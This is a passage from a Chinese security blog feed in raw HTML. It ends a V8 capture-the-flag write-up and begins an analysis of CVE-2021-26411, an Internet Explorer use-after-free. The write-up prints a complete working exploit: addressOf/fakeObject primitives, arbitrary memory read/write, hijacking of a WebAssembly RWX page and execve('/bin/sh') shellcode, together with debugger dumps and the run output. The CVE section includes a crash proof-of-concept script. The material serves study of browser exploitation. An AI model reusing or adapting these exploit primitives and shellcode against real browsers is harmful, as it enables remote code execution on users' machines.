class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x07a6bbc611c1</span><br><br>0x7a6bbc611c1: [SharedFunctionInfo] in OldSpace<br><br> - map: 0x39e2f26009e1 &lt;Map[56]&gt;<br><br> - name: 0x39e2f2604ae1 &lt;String[#1]: 0&gt;<br><br> - kind: NormalFunction<br><br> - function_map_index: 144<br><br> - formal_parameter_count: 0<br><br> - expected_nof_properties: 0<br><br> - language_mode: sloppy<br><br> - data: 0x07a6bbc61199 &lt;WasmExportedFunctionData&gt;<br><br> - code (from data): 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;<br><br> - function token position: -1<br><br> - start position: -1<br><br> - end position: -1<br><br> - no debug info<br><br> - scope info: 0x39e2f2600c61 &lt;ScopeInfo[0]&gt;<br><br> - length: 0<br><br> - feedback_metadata: 0x39e2f2602a39: [FeedbackMetadata]<br><br> - map: 0x39e2f2601319 &lt;Map&gt;<br><br> - slot_count: 0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"> pwndbg&gt; </span><span class="language-bash">job 0x07a6bbc61199</span><br><br> 0x7a6bbc61199: [WasmExportedFunctionData] in OldSpace<br><br> - map: 0x39e2f2605879 &lt;Map[40]&gt;<br><br> - wrapper_code: 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;<br><br> - instance: 0x07a6bbc61001 &lt;Instance map = 0x123928789789&gt;<br><br> - function_index: 0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"> pwndbg&gt; </span><span class="language-bash">x/20gx 0x07a6bbc61000</span><br><br>0x7a6bbc61000:  0x0000123928789789  0x000039e2f2600c71<br><br>0x7a6bbc61010:  0x000039e2f2600c71  0x00007f82cc930000<br><br>0x7a6bbc61020:  0x0000000000010000  0x000000000000ffff<br><br>0x7a6bbc61030:  0x0000562dc02eb698  0x000039e2f2600c71<br><br>0x7a6bbc61040:  0x0000562dc036f190  0x000039e2f26004d1<br><br>0x7a6bbc61050:  0x0000000000000000  0x0000000000000000<br><br>0x7a6bbc61060:  0x0000000000000000  0x0000000000000000<br><br>0x7a6bbc61070:  0x0000562dc0371740  0x000039e2f26004d1<br><br>0x7a6bbc61080:  0x0000562dc02e19d0  0x00002b7465e6a000 起始地址<br><br>0x7a6bbc61090:  0x00003c59d768f699  0x00003c59d768f909<br></code></pre></td></tr></table></figure><p>编写泄露这块内存页的代码 </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> instance_addr = addressOf(wasmInstance);<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;f_addr:0x&quot;</span>+hex(instance_addr));<br><br><span class="hljs-keyword">var</span> rwx_addr=read64(instance_addr+<span class="hljs-number">0x88</span>n<span class="hljs-number">-0x1</span>n);<br></code></pre></td></tr></table></figure><p>通过ArrayBuffer和DataView可以很方便的处理shellcode,将ArrayBuffer中存储数据的backing_store修改为rwx的内存页 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3d5eba7d0121</span><br><br>0x3d5eba7d0121: [JSArrayBuffer]<br><br> - map: 0x2f9288cc21b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]<br><br> - prototype: 0x22669038e981 &lt;Object map = 0x2f9288cc2209&gt;<br><br> - elements: 0x0b9b83c00c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]<br><br> - embedder fields: 2<br><br> - backing_store: 0x563b32f3fda0<br><br> - byte_length: 256<br><br> - detachable<br><br> - properties: 0x0b9b83c00c71 &lt;FixedArray[0]&gt; &#123;&#125;<br><br> - embedder fields = &#123;<br><br>  0, aligned pointer: (nil)<br><br>  0, aligned pointer: (nil)<br><br> &#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">x/20gx 0x563b32f3fda0</span><br><br>0x563b32f3fda0:  0xcdcccccccccc0040  0x9a99999999990140<br><br>0x563b32f3fdb0:  0x9a99999999990140  0x0000000000000000<br><br>0x563b32f3fdc0:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fdd0:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fde0:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fdf0:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fe00:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fe10:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fe20:  0x0000000000000000  0x0000000000000000<br><br>0x563b32f3fe30:  0x0000000000000000  0x0000000000000000<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x3d5eba7d0120</span><br><br>00:0000│ 0x3d5eba7d0120 —▸ 0x2f9288cc21b9 ◂— 0x800000b9b83c001<br><br>01:0008│ 0x3d5eba7d0128 —▸ 0xb9b83c00c71 ◂— 0xb9b83c008<br><br>02:0010│ 0x3d5eba7d0130 —▸ 0xb9b83c00c71 ◂— 0xb9b83c008<br><br>03:0018│ 0x3d5eba7d0138 ◂— 0x100<br><br>04:0020│ 0x3d5eba7d0140 —▸ 0x563b32f3fda0 ◂— 0xcdcccccccccc0040 /* &#x27;@&#x27; */<br><br>05:0028│ 0x3d5eba7d0148 ◂— 0x2<br><br>06:0030│ 0x3d5eba7d0150 ◂— 0x0<br><br>07:0038│ 0x3d5eba7d0158 ◂— 0x0<br></code></pre></td></tr></table></figure><h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br><br><span class="hljs-keyword">var</span> obj_arr = [obj];<br><br><span class="hljs-keyword">var</span> flo_arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1.1</span>];<br><br><span class="hljs-keyword">var</span> fake_arr=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">var</span> fake_obj=&#123;&#125;;<br><br>obj_arr_map=obj_arr.<span class="hljs-title function_">oob</span>();<br><br>flo_arr_map=flo_arr.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2i</span>(<span class="hljs-params">f</span>)<br><br>&#123;<br><br> f64[<span class="hljs-number">0</span>] = f;<br><br> <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">i2f</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  bigUint64[<span class="hljs-number">0</span>] = i;<br><br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//leak obj memory address</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj</span>)&#123;<br><br>  obj_arr[<span class="hljs-number">0</span>]=obj;<br><br>  obj_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">let</span> obj_addr=obj_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2i</span>(obj_addr);<br><br>&#125;<br><br><span class="hljs-comment">//fake obj by addr</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObject</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  flo_arr[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(addr);<br><br>  flo_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">let</span> fake_obj=flo_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  flo_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">return</span> fake_obj;<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  fake_arr[<span class="hljs-number">2</span>]=<span class="hljs-title function_">i2f</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">0x1n</span>);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;elements:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(fake_arr[<span class="hljs-number">2</span>])));<br><br>  <span class="hljs-keyword">let</span> ret_data=<span class="hljs-title function_">f2i</span>(fake_obj[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-comment">//%SystemBreak();</span><br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;read addr:0x:&quot;</span>+<span class="hljs-title function_">hex</span>(addr)+<span class="hljs-string">&quot; val:0x&quot;</span>+<span class="hljs-title function_">hex</span>(ret_data));<br><br>  <span class="hljs-keyword">return</span> ret_data;<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr,data</span>)&#123;<br><br>  fake_arr[<span class="hljs-number">2</span>]=<span class="hljs-title function_">i2f</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">0x1n</span>);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;elements:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(fake_arr[<span class="hljs-number">2</span>])));<br><br>  <span class="hljs-comment">//%SystemBreak();</span><br><br>  fake_obj[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(data);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;write addr:0x&quot;</span>+<span class="hljs-title function_">hex</span>(addr)+<span class="hljs-string">&quot; val:0x&quot;</span>+<span class="hljs-title function_">hex</span>(data));<br><br>&#125;<br><br> <br><br>fake_arr=[<br><br>  flo_arr_map,<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0n</span>),<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x41414141n</span>),<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x1000000000n</span>),<br><br> <span class="hljs-number">1.1</span>,<br><br> <span class="hljs-number">2.2</span><br><br>];<br><br>fake_addr=<span class="hljs-title function_">addressOf</span>(fake_arr);<br><br><span class="hljs-comment">//get elements:value &amp; fake obj</span><br><br><span class="hljs-keyword">var</span> fake_obj_addr=fake_addr-<span class="hljs-number">0x30n</span>;<br><br>fake_obj=<span class="hljs-title function_">fakeObject</span>(fake_obj_addr);<br><br><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><br><span class="hljs-keyword">var</span> fun = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-comment">//%DebugPrint(wasmInstance);</span><br><br><span class="hljs-keyword">var</span> instance_addr = <span class="hljs-title function_">addressOf</span>(wasmInstance);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;f_addr:0x&quot;</span>+<span class="hljs-title function_">hex</span>(instance_addr));<br><br><span class="hljs-keyword">var</span> rwx_addr=<span class="hljs-title function_">read64</span>(instance_addr+<span class="hljs-number">0x88n</span>-<span class="hljs-number">0x1n</span>);<br><br><span class="hljs-keyword">var</span> shellcode = [<br><br> <span class="hljs-number">0x2fbb485299583b6an</span>,<br><br> <span class="hljs-number">0x5368732f6e69622fn</span>,<br><br> <span class="hljs-number">0x050f5e5457525f54n</span><br><br>];<br><br><span class="hljs-keyword">var</span> data_buf=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-keyword">var</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(data_buf);<br><br><span class="hljs-comment">//set ArrayBuffer backing_store</span><br><br><span class="hljs-keyword">var</span> backing_store_addr= <span class="hljs-title function_">addressOf</span>(data_buf)+<span class="hljs-number">0x20n</span>;<br><br><span class="hljs-title function_">write64</span>(backing_store_addr-<span class="hljs-number">0x1n</span>,rwx_addr);<br><br><span class="hljs-comment">//write shellcode</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;shellcode.<span class="hljs-property">length</span>;i++)&#123;<br><br>  data_view.<span class="hljs-title function_">setBigUint64</span>(i*<span class="hljs-number">8</span>,shellcode[i],<span class="hljs-literal">true</span>);<br><br>&#125;<br><br><span class="hljs-title function_">fun</span>();<br><br>v8 <span class="hljs-attr">git</span>:(6dc88c191f) ✗ ./out/x64_startctf.<span class="hljs-property">release</span>/d8 --allow-natives-syntax ./test.<span class="hljs-property">js</span><br><br><span class="hljs-attr">f_addr</span>:<span class="hljs-number">0x14a0c25a1e69</span><br><br><span class="hljs-attr">elements</span>:<span class="hljs-number">0x14a0c25a1ee1</span><br><br>read <span class="hljs-attr">addr</span>:0<span class="hljs-attr">x</span>:14a0c25a1ef0 <span class="hljs-attr">val</span>:<span class="hljs-number">0x326e60143000</span><br><br><span class="hljs-attr">elements</span>:<span class="hljs-number">0x725e5110161</span><br><br>write <span class="hljs-attr">addr</span>:<span class="hljs-number">0x725e5110170</span> <span class="hljs-attr">val</span>:<span class="hljs-number">0x326e60143000</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">df</span> -h<br><br>Filesystem   Size Used Avail Use% Mounted on<br><br>udev      3.9G   0 3.9G  0% /dev<br><br>tmpfs      793M 2.0M 791M  1% /run<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-26411漏洞分析报告</title>
    <link href="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    <url>/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h3><p>CVE-2021-26411 该漏洞存在于iexplore.exe mshtml.dll模块,在JS9引擎处理dom对象时,由于未对nodevalue对象的有效性做判断,所导致的UAF漏洞,该漏洞可实现RCE.</p><h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h3><p>漏洞poc</p><p>poc比较简单,首先创建了一个element.</p><p>创建了2个Attribute属性.</p><p>声明了一个对象obj,将obj的valueof函数进行了重载,重载后的函数会清空element的所有属性</p><p>attr1赋值obj,attr2赋值123,然后将将这两个属性赋值于element</p><p>最后清除element的attr1属性.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-keyword">var</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>); <br><span class="hljs-keyword">var</span> attr1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;yyy&#x27;</span>); <br><span class="hljs-keyword">var</span> attr2 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;zzz&#x27;</span>); <br><br><span class="hljs-keyword">var</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">valueOf</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        element.<span class="hljs-title function_">clearAttributes</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;<br>&#125;;<br><br>attr1.<span class="hljs-property">nodeValue</span> = obj;<br>attr2.<span class="hljs-property">nodeValue</span> = <span class="hljs-number">123</span>;<br>element.<span class="hljs-title function_">setAttributeNode</span>(attr1);<br>element.<span class="hljs-title function_">setAttributeNode</span>(attr2);<br>element.<span class="hljs-title function_">removeAttributeNode</span>(attr1); <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>通过poc来看,最有可能产生uaf的代码可能是,obj.valueof重载后的回调函数,和最后element清除attr1属性的操作.但是并不确定obj.valueof()何时会被调用,代码中没有直接调用.</p><p>开始进行调试,程序会中断于此处,edx是CAttrArray,此处为空,在取偏移为0xC的值时,引发了空指针异常.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121164641368.png" alt="image-20220121164641368"></p><p>通过调用堆栈来看,程序会通过CElement::ie9_removeAttrubuteNode-&gt;ie9_removeAttributeNodeInternal-&gt;CattrArray::Destroy函数调用清除attr1.</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">element.remove<span class="hljs-constructor">AttributeNode(<span class="hljs-params">attr1</span>)</span>; <br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121164342089.png" alt="image-20220121164342089"></p><p>下面对CElement::ie9_removeAttributeNodeInternal函数进行分析</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121165916150.png" alt="image-20220121165916150"></p><p>当前CElement对象</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121170020460.png" alt="image-20220121170020460"></p><p>首先会调用函数查找需要移除的Attr对象在CAttrArray中的索引</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121170213610.png" alt="image-20220121170213610"></p><p>在CBase::FindAAIndexNS中可知CElement+0x10位置是CAttrArray数组,在数组中CAttrArray+8位置,可以看到数组.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121170633424.png" alt="image-20220121170633424"></p><p> 